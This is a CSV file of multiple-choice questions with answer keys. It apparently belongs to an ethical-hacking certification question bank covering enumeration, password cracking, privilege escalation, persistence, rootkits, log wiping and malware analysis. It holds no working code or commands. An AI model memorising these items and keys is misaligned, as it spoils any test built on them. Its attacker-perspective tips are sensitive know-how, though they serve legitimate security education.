index,question,options,answer_key
74,What is fragroute primarily used for?,"{'A': 'Altering network routes', 'B': 'Capturing fragmented packets', 'C': 'Fragmenting application traffic', 'D': 'Fragmenting layer 2 and layer 3 headers'}",C
75,What is are RPCs primarily used for?,"{'A': 'Interprocess communications', 'B': 'Interprocess semaphores', 'C': 'Remote method invocation', 'D': 'Process demand paging'}",A
76,What would you be trying to enumerate if you were to use enum4linux?,"{'A': 'Procedures', 'B': 'Linux-based services', 'C': 'Shares and/or users', 'D': 'Memory utilization'}",C
77,How do you authenticate with SNMPv1?,"{'A': 'Username/password', 'B': 'Hash', 'C': 'Public string', 'D': 'Community string'}",D
78,What SMTP command would you use to get the list of users in a mailing list?,"{'A': 'EXPD', 'B': 'VRFY', 'C': 'EXPN', 'D': 'VRML'}",C
79,What type of enumeration would you use the utility dirb for?,"{'A': 'Directory listings', 'B': 'Directory enumeration', 'C': 'Brute force dialing', 'D': 'User directory analysis'}",B
80,What are data descriptions in SNMP called?,"{'A': 'Management-based information', 'B': 'Data structure definition', 'C': 'Extensible markup language', 'D': 'Management information base'}",D
81,What is the process Java programs identify themselves to if they are sharing procedures over the network?,"{'A': 'RMI registry', 'B': 'RMI mapper', 'C': 'RMI database', 'D': 'RMI process'}",A
82,You are working with a colleague and you see them interacting with an email server using the VRFY command. What is it your colleague is doing?,"{'A': 'Verifying SMTP commands', 'B': 'Verifying mailing lists', 'C': 'Verifying email addresses', 'D': 'Verifying the server config'}",C
83,What is the SMB protocol used for?,"{'A': 'Data transfers using NFS', 'B': 'Data transfers on Windows systems', 'C': 'Data transfers for email attachments', 'D': 'Data transfers for Windows Registry updates'}",B
84,Which of these is a built-in program on Windows for gathering information using SMB?,"{'A': 'nmblookup', 'B': 'smbclient', 'C': 'Metasploit', 'D': 'nbtstat'}",D
85,What status code will you get if your attempt to use the VRFY command fails?,"{'A': '550', 'B': '501', 'C': '250', 'D': '200'}",A
86,What program would you use to enumerate services?,"{'A': 'smbclient', 'B': 'Nmap', 'C': 'enum4linux', 'D': 'snmpwalk'}",B
87,What version of SNMP introduced encryption and user-based authentication?,"{'A': '1', 'B': '2', 'C': '2c', 'D': '3'}",D
88,Which of these could you enumerate on a WordPress site using wpscan?,"{'A': 'Plug-ins', 'B': 'Posts', 'C': 'Administrators', 'D': 'Versions'}",A
89,Which of these tools allows you to create your own enumeration function based on ports being identified as open?,"{'A': 'Metasploit', 'B': 'Nmap', 'C': 'Netcat', 'D': 'nbtstat'}",B
90,What underlying functionality is necessary to enable Windows file sharing?,"{'A': 'Network File System', 'B': 'Common Internet File System', 'C': 'Remote procedure call', 'D': 'Remote Method Invocation'}",C
91,What is the IPC$ share used for?,"{'A': 'Process piping', 'B': 'Interprocess construction', 'C': 'Remote process management', 'D': 'Interprocess communication'}",D
92,What tool does a Java program need to use to implement remote process communication?,"{'A': 'JRE', 'B': 'rmic', 'C': 'rmir', 'D': 'JDK'}",B
93,Which of these passes objects between systems?,"{'A': 'SunRPC', 'B': 'SMB', 'C': 'RMI', 'D': 'Nmap'}",C
94,"If you needed to enumerate data across multiple services and also store the data for retrieval later, what tool would you use?","{'A': 'Metasploit', 'B': 'Nmap', 'C': 'RMI', 'D': 'Postgres'}",A
95,What are the three times that are typically stored as part of file metadata?,"{'A': 'Moves, adds, changes', 'B': 'Modified, accessed, deleted', 'C': 'Moved, accessed, changed', 'D': 'Modified, accessed, created'}",D
96,What is it called when you obtain administrative privileges from a normal user account?,"{'A': 'Privilege escalation', 'B': 'Account migration', 'C': 'Privilege migration', 'D': 'Account escalation'}",A
97,"What does John the Ripperâ€™s single crack mode, the default mode, do?","{'A': 'Checks every possible password', 'B': 'Uses known information and mangling rules', 'C': 'Uses a built-in wordlist', 'D': 'Uses wordlist and mangling rules'}",B
98,What is the trade-off for using rainbow tables?,"{'A': 'Disk space prioritized over speed', 'B': 'Accuracy prioritized over disk space', 'C': 'Speed prioritized over accuracy', 'D': 'Speed prioritized over disk space'}",D
99,Which of these is a reason to use an exploit against a local vulnerability?,"{'A': 'Pivoting', 'B': 'Log manipulation', 'C': 'Privilege escalation', 'D': 'Password collection'}",C
100,What is it called when you manipulate the time stamps on files?,"{'A': 'Time stamping', 'B': 'Timestomping', 'C': 'Meta stomping', 'D': 'Meta manipulation'}",B
101,What would an attacker use an alternate data stream on a Windows system for?,"{'A': 'Hiding files', 'B': 'Running programs', 'C': 'Storing PowerShell scripts', 'D': 'Blocking files'}",A
102,Which of these techniques might be used to maintain access to a system?,"{'A': 'Run key in the Windows Registry', 'B': 'Alternate data stream', 'C': '.vimrc file on Linux', 'D': 'PowerShell'}",A
103,"If you were looking for reliable exploits you could use against known vulnerabilities, what would you use?","{'A': 'Tor network', 'B': 'Meterpreter', 'C': 'msfvenom', 'D': 'Exploit-DB'}",D
104,What might an attacker be trying to do by using the clearev command in Meterpreter?,"{'A': 'Run an exploit', 'B': 'Manipulate time stamps', 'C': 'Manipulate log files', 'D': 'Remote login'}",C
105,You find after you get access to a system that you are the user www-data. What might you try to do very shortly after getting access to the system?,"{'A': 'Pivot to another network', 'B': 'Elevate privileges', 'C': 'Wipe logs', 'D': 'Exploit the web browser'}",B
106,Youâ€™ve installed multiple files and processes on the compromised system. What should you also look at installing?,"{'A': 'Registry keys', 'B': 'Alternate data streams', 'C': 'Rootkit', 'D': 'Root login'}",C
107,What does pivoting on a compromised system get you?,"{'A': 'Database access', 'B': 'A route to extra networks', 'C': 'Higher level of privileges', 'D': 'Persistent access'}",B
108,What would you use the program rtgen for?,"{'A': 'Generating wordlists', 'B': 'Generating rainbow tables', 'C': 'Generating firewall rules', 'D': 'Persistent access'}",B
109,Which of these would be a way to exploit a client-side vulnerability?,"{'A': 'Sending malformed packets to a web server', 'B': 'Sending large ICMP packets', 'C': 'Sending a crafted URL', 'D': 'Brute-force password attack'}",C
110,What is one outcome from process injection?,"{'A': 'Hidden process', 'B': 'Rootkit', 'C': 'Alternate data streams', 'D': 'Steganography'}",A
111,What tool would you use to compromise a system and then perform post-exploitation actions?,"{'A': 'Nmap', 'B': 'John the Ripper', 'C': 'searchsploit', 'D': 'Metasploit'}",D
112,What application would be a common target for client-side exploits?,"{'A': 'Web server', 'B': 'Web browser', 'C': 'Web application firewall', 'D': 'Web pages'}",B
113,What are two advantages of using a rootkit?,"{'A': 'Installing alternate data streams and Registry keys', 'B': 'Creating Registry keys and hidden processes', 'C': 'Hiding processes and files', 'D': 'Hiding files and Registry keys'}",C
114,What could you use to obtain password hashes from a compromised system?,"{'A': 'John the Ripper', 'B': 'Mimikatz', 'C': 'Rainbow tables', 'D': 'Process dumping'}",B
115,"In a botnet, what are the systems that tell individual bots what to do called?","{'A': 'C2 servers', 'B': 'IRC servers', 'C': 'HTTP servers', 'D': 'ISC2 servers'}",A
116,What is the primary difference between a worm and a virus?,"{'A': 'A worm uses polymorphic code.', 'B': 'A virus uses polymorphic code.', 'C': 'A worm can self-propagate.', 'D': 'A virus can self-propagate.'}",C
117,What is one advantage of static analysis over dynamic analysis of malware?,"{'A': 'Malware is guaranteed to deploy.', 'B': 'Dynamic analysis is untrustworthy.', 'C': 'Static analysis limits your exposure to infection.', 'D': 'Static analysis can be run in virtual machines.'}",C
118,What would you use VirusTotal for?,"{'A': 'Checking your system for viruses', 'B': 'Endpoint protection', 'C': 'As a repository of malware research', 'D': 'Identifying malware against antivirus engines'}",D
119,What are two sections you would commonly find in a portable executable file?,"{'A': 'Text and binary', 'B': 'Binary and data', 'C': 'Addresses and operations', 'D': 'Text and data'}",D
120,What could you use to generate your own malware?,"{'A': 'Empire', 'B': 'Metasploit', 'C': 'Rcconsole', 'D': 'IDA Pro'}",B
121,What is the purpose of a packer for malware?,"{'A': 'To obscure the actual program', 'B': 'To ensure that the program is all binary', 'C': 'To compile the program into a tight space', 'D': 'To remove null characters'}",A
122,What is the primary purpose of polymorphic code for malware programs?,"{'A': 'Efficiency of execution', 'B': 'Propagation of the malware', 'C': 'Antivirus evasion', 'D': 'Faster compilation'}",C
123,What would be one reason not to write malware in Python?,"{'A': 'Python interpreter is slow.', 'B': 'Python interpreter may not be available.', 'C': 'Library support is inadequate.', 'D': 'Python is a hard language to learn.'}",B
124,What would you use Cuckoo Sandbox for?,"{'A': 'Static analysis of malware', 'B': 'Malware development', 'C': 'Dynamic analysis of malware', 'D': 'Manual analysis of malware'}",C
125,"If you wanted a tool that could help with both static and dynamic analysis of malware, which would you choose?","{'A': 'Cutter', 'B': 'IDA', 'C': 'PE Explorer', 'D': 'MalAlyzer'}",B
126,What is the purpose of using a disassembler?,"{'A': 'Converting opcodes to mnemonics', 'B': 'Converting mnemonics to opcodes', 'C': 'Translating mnemonics to operations', 'D': 'Removing the need for an assembler'}",A
127,What does the malware that is referred to as a dropper do?,"{'A': 'Drops antivirus operations', 'B': 'Drops CPU protections against malicious execution', 'C': 'Drops files that may be more malware', 'D': 'Drops the malware into the Recycle Bin'}",C
